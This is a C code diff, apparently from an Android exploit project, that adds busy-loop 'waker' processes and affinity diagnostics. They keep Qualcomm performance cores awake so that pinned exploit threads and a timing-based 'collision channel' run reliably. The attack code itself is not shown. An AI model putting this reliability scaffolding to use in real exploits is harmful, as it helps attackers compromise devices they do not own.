@@ -159,27 +159,36 @@ static const char *rmg_temp_str(int millideg) {
   return buf;
 }
 
+static void rmg_log_pin_diag(const char *why);
+
 /*
- * Thermal/PM-aware gate wait (2026-08-27, round 2). The perf-core
- * restriction is DYNAMIC within a single attempt: observed open at
- * attempt start ("gate core cpu=4 consumer cpu=5") and fully closed
- * ~30s later after the scan/reclaim load heats the device ("gate no
- * perf core usable"). Failing immediately just re-runs the hot scan on
- * the next attempt and cooks the device further. Instead: poll the pair
- * availability while the device cools (the pipeline holds a wakelock but
- * the CPU load drops to near zero while waiting), up to max_wait_sec.
- * Returns 1 when a legal pair is pinned, 0 when the budget burns out
- * (caller fails the attempt cleanly).
+ * Gate wait (2026-08-27, round 4 — root cause known). The perf-core
+ * "restriction" is Qualcomm WALT CPU HALT: walt_halt.c's vendor hook
+ * android_rvh_set_cpus_allowed_by_task rejects user sched_setaffinity
+ * onto HALTED cores with EINVAL. core_ctl halts idle perf cores
+ * (min_cpus=3 -> one rotating A715 halted at idle), thermal_pause and
+ * hyp_core_ctl stack on top. The pipeline's quiet-window wait idles the
+ * device, which is exactly what halts the cores before the gate probe.
+ * rmg_waker_start() runs a busy crew with wide affinity so core_ctl
+ * resumes the cluster (verified on device: load resumes halted cores in
+ * seconds); the wait below is the safety net for thermal/hyp pauses
+ * that load cannot override (those need cooldown / VM teardown). The
+ * first probe miss logs full diagnostics (allowed mask + per-core
+ * errno) to tell a cpuset wall from a halt. Returns 1 when a legal
+ * pair is pinned, 0 when the budget burns out (caller fails cleanly).
  */
 int rmg_pin_gate_wait(int max_wait_sec, const char *stage) {
   for (int waited = 0;; waited += 2) {
     if (rmg_pin_gate_ready()) {
       if (waited > 0) {
-        pr_success("pin gate %s: perf pair available after %ds cooling "
+        pr_success("pin gate %s: perf pair available after %ds wait "
                    "(core=%d consumer=%d)\n",
                    stage, waited, rmg_pinned_core, rmg_consumer_core);
       }
       return 1;
+    }
+    if (waited == 0) {
+      rmg_log_pin_diag(stage);
     }
     if (waited >= max_wait_sec) {
       int t = rmg_max_cpu_temp();
@@ -187,6 +196,7 @@ int rmg_pin_gate_wait(int max_wait_sec, const char *stage) {
                "zone %s; failing attempt cleanly\n",
                stage, waited,
                t < 0 ? "n/a" : rmg_temp_str(t));
+      rmg_log_pin_diag(stage);
       return 0;
     }
     if (waited % 20 == 0) {
@@ -198,6 +208,130 @@ int rmg_pin_gate_wait(int max_wait_sec, const char *stage) {
     }
     sleep(2);
   }
+}
+
+/*
+ * Cluster waker (2026-08-27, round 4). Busy-loop children with a wide
+ * affinity mask: their runnable demand makes WALT core_ctl resume the
+ * halted perf cores (need_cpus eval: busy_pct >= busy_up_thres and
+ * nrrun >= task_thres=4), so the gate probe and the pair pin land while
+ * the cluster is fully unhalted. Once the choreography pair is pinned,
+ * rmg_waker_relocate() moves the crew off the pair cores — the pinned
+ * exploit threads keep those two cores busy (halt only takes idle
+ * cores) and the crew must not disturb the calibrated collision
+ * channel. Children die with the parent (PR_SET_PDEATHSIG, verified
+ * parent at entry) and self-terminate after RMG_WAKER_MAX_LIFE_SEC
+ * (alarm), so a supervisor SIGKILL of the payload cannot leak spinning
+ * orphans.
+ */
+#define RMG_WAKER_MAX 6
+#define RMG_WAKER_MAX_LIFE_SEC 300
+
+static pid_t rmg_waker_pid[RMG_WAKER_MAX];
+static int rmg_waker_n = 0;
+
+static int rmg_waker_child_main(void) {
+  prctl(PR_SET_PDEATHSIG, SIGKILL);
+  if (getppid() == 1) {
+    _exit(0); /* parent already gone */
+  }
+  alarm(RMG_WAKER_MAX_LIFE_SEC);
+  cpu_set_t wide;
+  CPU_ZERO(&wide);
+  for (int c = 0; c < 8; c++) {
+    CPU_SET(c, &wide);
+  }
+  sched_setaffinity(0, sizeof(wide), &wide);
+  volatile unsigned long x = 0;
+  for (;;) {
+    x++;
+  }
+  return 0;
+}
+
+/* Top the waker crew up to n members (respawns dead ones). */
+void rmg_waker_start(int n) {
+  if (n > RMG_WAKER_MAX) {
+    n = RMG_WAKER_MAX;
+  }
+  for (int i = 0; i < n; i++) {
+    if (rmg_waker_pid[i] > 0 && kill(rmg_waker_pid[i], 0) == 0) {
+      continue; /* still alive */
+    }
+    pid_t p = fork();
+    if (p == 0) {
+      _exit(rmg_waker_child_main());
+    }
+    rmg_waker_pid[i] = p;
+  }
+  if (n > rmg_waker_n) {
+    rmg_waker_n = n;
+  }
+  pr_info("cluster waker: %d busy threads spawned to resume halted perf "
+          "cores\n", n);
+}
+
+/* Move the crew off the choreography pair (keeps cluster demand up
+ * without touching the calibrated cores). */
+void rmg_waker_relocate(int avoid_a, int avoid_b) {
+  cpu_set_t m;
+  CPU_ZERO(&m);
+  for (int c = 0; c < 8; c++) {
+    if (c != avoid_a && c != avoid_b) {
+      CPU_SET(c, &m);
+    }
+  }
+  for (int i = 0; i < rmg_waker_n; i++) {
+    if (rmg_waker_pid[i] > 0) {
+      sched_setaffinity(rmg_waker_pid[i], sizeof(m), &m);
+    }
+  }
+}
+
+void rmg_waker_stop(void) {
+  for (int i = 0; i < RMG_WAKER_MAX; i++) {
+    if (rmg_waker_pid[i] > 0) {
+      kill(rmg_waker_pid[i], SIGKILL);
+      waitpid(rmg_waker_pid[i], NULL, 0);
+      rmg_waker_pid[i] = 0;
+    }
+  }
+  rmg_waker_n = 0;
+}
+
+/* One-shot gate diagnostics: the task's own allowed list plus the
+ * per-core setaffinity errno — distinguishes a cpuset wall (core not
+ * in the allowed list, probe never reaches the syscall) from a WALT
+ * halt (EINVAL despite being listed) from anything else. */
+static void rmg_log_pin_diag(const char *why) {
+  char allowed[64] = "?";
+  FILE *f = fopen("/proc/self/status", "r");
+  if (f) {
+    char buf[256];
+    while (fgets(buf, sizeof(buf), f)) {
+      if (strncmp(buf, "Cpus_allowed_list:", 18) == 0) {
+        sscanf(buf + 18, " %63s", allowed);
+        break;
+      }
+    }
+    fclose(f);
+  }
+  cpu_set_t prev;
+  int have_prev = sched_getaffinity(0, sizeof(prev), &prev) == 0;
+  int err[4] = {0, 0, 0, 0};
+  for (int i = 0; i < 4; i++) {
+    int c = 3 + i;
+    cpu_set_t want;
+    CPU_ZERO(&want);
+    CPU_SET(c, &want);
+    err[i] = sched_setaffinity(0, sizeof(want), &want) == 0 ? 0 : errno;
+    if (have_prev) {
+      sched_setaffinity(0, sizeof(prev), &prev);
+    }
+  }
+  pr_info("pin diag %s: allowed=%s setaffinity errno cpu3=%d cpu4=%d "
+          "cpu5=%d cpu6=%d (22=EINVAL: halted or walled)\n",
+          why, allowed, err[0], err[1], err[2], err[3]);
 }
 #endif
 
